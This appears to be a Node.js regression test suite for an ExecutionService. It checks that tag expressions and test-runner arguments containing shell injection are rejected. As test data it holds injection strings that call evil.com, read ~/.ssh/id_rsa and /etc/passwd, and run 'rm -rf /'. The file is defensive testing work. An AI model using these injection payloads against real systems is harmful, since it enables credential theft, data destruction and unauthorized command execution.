import { describe, it } from 'node:test';
import * as assert from 'node:assert';
import { ExecutionService } from '../services/ExecutionService.js';
import * as path from 'path';
import * as fs from 'fs';
describe('ExecutionService - Issue #17: Shell Injection Prevention', () => {
    let executionService;
    let testProjectRoot;
    // Setup before each test
    function setupTest() {
        executionService = new ExecutionService();
        testProjectRoot = path.join(process.cwd(), 'test-proj-' + Date.now());
        if (!fs.existsSync(testProjectRoot)) {
            fs.mkdirSync(testProjectRoot, { recursive: true });
        }
        // Create minimal wdio.conf.ts so test doesn't fail on config file check
        fs.writeFileSync(path.join(testProjectRoot, 'wdio.conf.ts'), 'export const config = { runner: "local", framework: "cucumber" };');
        // Create reports directory for later
        fs.mkdirSync(path.join(testProjectRoot, 'reports'), { recursive: true });
    }
    // Cleanup after each test
    function cleanupTest() {
        if (fs.existsSync(testProjectRoot)) {
            fs.rmSync(testProjectRoot, { recursive: true, force: true });
        }
    }
    describe('Tag Expression Validation', () => {
        it('should accept valid tag expressions with @, alphanumeric, spaces, brackets, and logical operators', async () => {
            setupTest();
            try {
                const validTags = [
                    '@smoke',
                    '@smoke and @android',
                    '(@smoke or @regression) and @android',
                    '@smoke, @android',
                    '(@ui and !@flaky)',
                    '@login | @logout'
                ];
                for (const tags of validTags) {
                    const result = await executionService['runTest'](testProjectRoot, { tags });
                    // The test may fail for other reasons (no actual test files), but validation should pass
                    if (result.error) {
                        assert.ok(!result.error.includes('Invalid tag expression'), `Valid tag "${tags}" was rejected: ${result.error}`);
                    }
                }
            }
            finally {
                cleanupTest();
            }
        });
        it('should reject tag expression with shell injection attempt (semicolon)', async () => {
            setupTest();
            try {
                const maliciousTags = '@smoke"; echo INJECTED; echo "rest';
                const result = await executionService['runTest'](testProjectRoot, { tags: maliciousTags });
                assert.strictEqual(result.success, false, 'Shell injection should fail');
                assert.ok(result.error?.includes('Invalid tag expression'), `Expected "Invalid tag expression" error, got: ${result.error}`);
            }
            finally {
                cleanupTest();
            }
        });
        it('should reject tag expression with shell injection attempt (backtick)', async () => {
            setupTest();
            try {
                const maliciousTags = '@smoke`whoami`';
                const result = await executionService['runTest'](testProjectRoot, { tags: maliciousTags });
                assert.strictEqual(result.success, false, 'Shell injection should fail');
                assert.ok(result.error?.includes('Invalid tag expression'), `Expected "Invalid tag expression" error, got: ${result.error}`);
            }
            finally {
                cleanupTest();
            }
        });
        it('should reject tag expression with shell injection attempt (dollar sign)', async () => {
            setupTest();
            try {
                const maliciousTags = '@smoke$(curl http://evil.com)';
                const result = await executionService['runTest'](testProjectRoot, { tags: maliciousTags });
                assert.strictEqual(result.success, false, 'Shell injection should fail');
                assert.ok(result.error?.includes('Invalid tag expression'), `Expected "Invalid tag expression" error, got: ${result.error}`);
            }
            finally {
                cleanupTest();
            }
        });
        it('should reject tag expression with pipe operator (shell redirection)', async () => {
            setupTest();
            try {
                const maliciousTags = '@smoke | cat /etc/passwd';
                const result = await executionService['runTest'](testProjectRoot, { tags: maliciousTags });
                assert.strictEqual(result.success, false, 'Shell injection should fail');
                assert.ok(result.error?.includes('Invalid tag expression'), `Expected "Invalid tag expression" error, got: ${result.error}`);
            }
            finally {
                cleanupTest();
            }
        });
        it('should accept empty tag expression', async () => {
            setupTest();
            try {
                const result = await executionService['runTest'](testProjectRoot, { tags: '' });
                // Should not fail on tag validation
                if (result.error) {
                    assert.ok(!result.error.includes('Invalid tag expression'), `Empty tag was rejected: ${result.error}`);
                }
            }
            finally {
                cleanupTest();
            }
        });
    });
    describe('specificArgs Validation', () => {
        it('should accept valid specificArgs without shell metacharacters', async () => {
            setupTest();
            try {
                const validArgs = [
                    '--timeout 30000',
                    '--maxInstances 2',
                    '--logLevel info'
                ];
                for (const args of validArgs) {
                    const result = await executionService['runTest'](testProjectRoot, { specificArgs: args });
                    // Validation should pass (may fail for other reasons)
                    if (result.error) {
                        assert.ok(!result.error.includes('Invalid specificArgs'), `Valid args "${args}" were rejected: ${result.error}`);
                    }
                }
            }
            finally {
                cleanupTest();
            }
        });
        it('should reject specificArgs with semicolon injection', async () => {
            setupTest();
            try {
                const maliciousArgs = '--timeout 30000; curl http://evil.com';
                const result = await executionService['runTest'](testProjectRoot, { specificArgs: maliciousArgs });
                assert.strictEqual(result.success, false, 'Semicolon injection should fail');
                assert.ok(result.error?.includes('Invalid specificArgs'), `Expected "Invalid specificArgs" error, got: ${result.error}`);
            }
            finally {
                cleanupTest();
            }
        });
        it('should reject specificArgs with ampersand injection', async () => {
            setupTest();
            try {
                const maliciousArgs = '--timeout 30000 & curl http://evil.com';
                const result = await executionService['runTest'](testProjectRoot, { specificArgs: maliciousArgs });
                assert.strictEqual(result.success, false, 'Ampersand injection should fail');
                assert.ok(result.error?.includes('Invalid specificArgs'), `Expected "Invalid specificArgs" error, got: ${result.error}`);
            }
            finally {
                cleanupTest();
            }
        });
        it('should reject specificArgs with backtick injection', async () => {
            setupTest();
            try {
                const maliciousArgs = '--timeout `whoami`';
                const result = await executionService['runTest'](testProjectRoot, { specificArgs: maliciousArgs });
                assert.strictEqual(result.success, false, 'Backtick injection should fail');
                assert.ok(result.error?.includes('Invalid specificArgs'), `Expected "Invalid specificArgs" error, got: ${result.error}`);
            }
            finally {
                cleanupTest();
            }
        });
        it('should reject specificArgs with dollar sign injection', async () => {
            setupTest();
            try {
                const maliciousArgs = '--log $(cat ~/.ssh/id_rsa)';
                const result = await executionService['runTest'](testProjectRoot, { specificArgs: maliciousArgs });
                assert.strictEqual(result.success, false, 'Dollar sign injection should fail');
                assert.ok(result.error?.includes('Invalid specificArgs'), `Expected "Invalid specificArgs" error, got: ${result.error}`);
            }
            finally {
                cleanupTest();
            }
        });
        it('should reject specificArgs with pipe operator', async () => {
            setupTest();
            try {
                const maliciousArgs = '--logLevel info | tee /tmp/exfil.log';
                const result = await executionService['runTest'](testProjectRoot, { specificArgs: maliciousArgs });
                assert.strictEqual(result.success, false, 'Pipe injection should fail');
                assert.ok(result.error?.includes('Invalid specificArgs'), `Expected "Invalid specificArgs" error, got: ${result.error}`);
            }
            finally {
                cleanupTest();
            }
        });
        it('should reject specificArgs with greater-than redirection', async () => {
            setupTest();
            try {
                const maliciousArgs = '--log output > /tmp/exfil.log';
                const result = await executionService['runTest'](testProjectRoot, { specificArgs: maliciousArgs });
                assert.strictEqual(result.success, false, 'Redirection injection should fail');
                assert.ok(result.error?.includes('Invalid specificArgs'), `Expected "Invalid specificArgs" error, got: ${result.error}`);
            }
            finally {
                cleanupTest();
            }
        });
        it('should reject specificArgs with quotes injection', async () => {
            setupTest();
            try {
                const maliciousArgs = '--timeout "30000; whoami"';
                const result = await executionService['runTest'](testProjectRoot, { specificArgs: maliciousArgs });
                assert.strictEqual(result.success, false, 'Quote injection should fail');
                assert.ok(result.error?.includes('Invalid specificArgs'), `Expected "Invalid specificArgs" error, got: ${result.error}`);
            }
            finally {
                cleanupTest();
            }
        });
        it('should accept empty specificArgs', async () => {
            setupTest();
            try {
                const result = await executionService['runTest'](testProjectRoot, { specificArgs: '' });
                // Should not fail on arg validation
                if (result.error) {
                    assert.ok(!result.error.includes('Invalid specificArgs'), `Empty args were rejected: ${result.error}`);
                }
            }
            finally {
                cleanupTest();
            }
        });
    });
    describe('Combined validation scenarios', () => {
        it('should validate both tags and specificArgs together', async () => {
            setupTest();
            try {
                const result = await executionService['runTest'](testProjectRoot, {
                    tags: '@smoke"; echo INJECTED',
                    specificArgs: '--timeout 30000'
                });
                assert.strictEqual(result.success, false, 'Injected tags should fail');
                assert.ok(result.error?.includes('Invalid tag expression'), `Expected tag validation error, got: ${result.error}`);
            }
            finally {
                cleanupTest();
            }
        });
        it('should catch specificArgs even when tags are valid', async () => {
            setupTest();
            try {
                const result = await executionService['runTest'](testProjectRoot, {
                    tags: '@smoke',
                    specificArgs: '--timeout 30000; whoami'
                });
                assert.strictEqual(result.success, false, 'Injected args should fail');
                assert.ok(result.error?.includes('Invalid specificArgs'), `Expected args validation error, got: ${result.error}`);
            }
            finally {
                cleanupTest();
            }
        });
        it('should reject request with both tags and specificArgs injected', async () => {
            setupTest();
            try {
                const result = await executionService['runTest'](testProjectRoot, {
                    tags: '@smoke`id`',
                    specificArgs: '--log | tee /tmp/log'
                });
                assert.strictEqual(result.success, false, 'Injected inputs should fail');
                assert.ok(result.error?.includes('Invalid tag expression'), `Expected tag validation error, got: ${result.error}`);
            }
            finally {
                cleanupTest();
            }
        });
    });
    describe('Regression: Original vulnerability scenarios', () => {
        it('should block the exact injection from Issue #17 reproduction steps', async () => {
            setupTest();
            try {
                // From the issue: tags: '@smoke"; echo INJECTED; echo "rest'
                const result = await executionService['runTest'](testProjectRoot, {
                    tags: '@smoke"; echo INJECTED; echo "rest'
                });
                assert.strictEqual(result.success, false, 'Issue #17 injection should fail');
                assert.ok(result.error?.includes('Invalid tag expression'), `Expected tag validation error for Issue #17, got: ${result.error}`);
            }
            finally {
                cleanupTest();
            }
        });
        it('should not write files or execute operations if validation fails', async () => {
            setupTest();
            try {
                const maliciousTags = '@smoke"; rm -rf /';
                const result = await executionService['runTest'](testProjectRoot, { tags: maliciousTags });
                // Should return validation error immediately
                assert.strictEqual(result.success, false, 'Rm injection should fail');
                assert.ok(result.error?.includes('Invalid tag expression'), `Expected tag validation error, got: ${result.error}`);
                // Verify testProjectRoot still exists (rm command was never executed)
                assert.ok(fs.existsSync(testProjectRoot), 'Test project directory should still exist after blocked injection');
            }
            finally {
                cleanupTest();
            }
        });
    });
});
